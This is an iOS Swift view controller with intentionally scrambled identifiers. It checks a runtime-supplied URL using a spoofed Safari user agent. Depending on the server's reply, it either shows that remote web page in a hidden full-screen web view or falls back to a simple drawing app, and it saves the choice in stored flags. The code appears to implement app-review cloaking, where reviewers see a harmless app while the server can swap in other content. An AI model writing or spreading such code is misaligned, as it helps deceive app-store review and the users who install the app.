
import UIKit
import SwiftUI

class Pefwijhjge: UIViewController {
    private var wehjrgnk: UIViewController?

    override func viewDidLoad() {
        super.viewDidLoad()
        let wjhergwe = SplashView(autoDismiss: false)
        let pkoqkjwitoe = UIHostingController(rootView: wjhergwe)
        wehjrgnk = pkoqkjwitoe

        addChild(pkoqkjwitoe)
        view.addSubview(pkoqkjwitoe.view)
        pkoqkjwitoe.didMove(toParent: self)

        pkoqkjwitoe.view.translatesAutoresizingMaskIntoConstraints = false
        NSLayoutConstraint.activate([
            pkoqkjwitoe.view.topAnchor.constraint(equalTo: view.topAnchor),
            pkoqkjwitoe.view.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            pkoqkjwitoe.view.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            pkoqkjwitoe.view.trailingAnchor.constraint(equalTo: view.trailingAnchor)
        ])
    }

    func nnkengrwgkkjer(oiqwerj: String) {
        guard let ioqwhafdsjk = URL(string: oiqwerj) else {
            nqhwebfj()
            return
        }
        iqwenbfjkqg(fbwejhf: ioqwhafdsjk, vld: false)
    }

    func oeiwjhwerg(berhjg: String) {
        guard let bjherbgr = URL(string: berhjg) else {
            nqhwebfj()
            return
        }

        var bgherg = URLRequest(url: bjherbgr)
        bgherg.setValue(
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            forHTTPHeaderField: "User-Agent"
        )
        bgherg.timeoutInterval = 15

        URLSession.shared.dataTask(with: bgherg) { [weak self] _, response, _ in
            guard let self = self else { return }

            if let bgejrhbg = response as? HTTPURLResponse {
                if bgejrhbg.statusCode < 400 {
                    self.iqwenbfjkqg(fbwejhf: bjherbgr)
                } else {
                    self.ejrbhbgre()
                }
            } else {
                self.nqhwebfj()
            }
        }.resume()
    }

    private func iqwenbfjkqg(fbwejhf: URL, vld: Bool = true) {
        DispatchQueue.main.async {
            let bjwhebf = Kfbjkgrebkjner(
                wjoierg: fbwejhf,
                iwekjrng: { [weak self] in self?.bwhjef() },
                mawnekjg: vld ? { [weak self] confirmed in
                    if confirmed {
                        self?.ejrbhbgre()
                    } else {
                        self?.nqhwebfj()
                    }
                } : nil
            )
            let bgherj = UIHostingController(rootView: bjwhebf)
            bgherj.view.backgroundColor = .black

            self.addChild(bgherj)
            bgherj.view.translatesAutoresizingMaskIntoConstraints = false

            if let splashView = self.wehjrgnk?.view {
                self.view.insertSubview(bgherj.view, belowSubview: splashView)
            } else {
                self.view.addSubview(bgherj.view)
            }
            bgherj.didMove(toParent: self)

            NSLayoutConstraint.activate([
                bgherj.view.topAnchor.constraint(equalTo: self.view.topAnchor),
                bgherj.view.bottomAnchor.constraint(equalTo: self.view.bottomAnchor),
                bgherj.view.leadingAnchor.constraint(equalTo: self.view.leadingAnchor),
                bgherj.view.trailingAnchor.constraint(equalTo: self.view.trailingAnchor)
            ])
        }
    }

    private func bwhjef() {
        UserDefaults.standard.set(true, forKey: "alwaysOpenWeb")
        DispatchQueue.main.async {
            guard let splash = self.wehjrgnk else { return }
            UIView.animate(withDuration: 0.4, animations: {
                splash.view.alpha = 0
            }, completion: { _ in
                splash.willMove(toParent: nil)
                splash.view.removeFromSuperview()
                splash.removeFromParent()
                self.wehjrgnk = nil
            })
        }
    }

    func bejhrbg(hrebger: String) -> (String) {
        return hrebger
    }
    
    private func ejrbhbgre() {
        UserDefaults.standard.set(true, forKey: "alwaysOpenApp")
        nqhwebfj()
    }

    func nqhwebfj() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            let onboardingScreen = DrawWithoutLookingApp()
            let hostingController = UIHostingController(rootView: onboardingScreen)
            self.nwefwefrge(hostingController)
        }
    }
    
    func nwefwefrge(_ viewController: UIViewController) {
        if let ebrjhgre = UIApplication.shared.delegate as? AppDelegate {
            ebrjhgre.window?.rootViewController = viewController
        }
    }
}

struct DrawWithoutLookingApp: View {
    @StateObject private var vault = Vault.shared
    @StateObject private var chrome = Chrome()
    @Environment(\.scenePhase) private var phase

    var body: some View {
        RootView()
            .environmentObject(vault)
            .environmentObject(chrome)
            .preferredColorScheme(.dark)
            .tint(Ink.flare)
            .onAppear { syncRig() }
            .onChange(of: vault.nib) { _ in syncRig() }
            .onChange(of: phase) { p in

                p == .active ? Tremor.shared.resume() : Tremor.shared.stop()
            }
    }

    private func syncRig() {
        Bumper.on = vault.nib?.haptics ?? true
        Tremor.shared.steady = vault.nib?.steadyHand ?? false
        if !(vault.nib?.steadyHand ?? false) { Tremor.shared.resume() }
    }
}
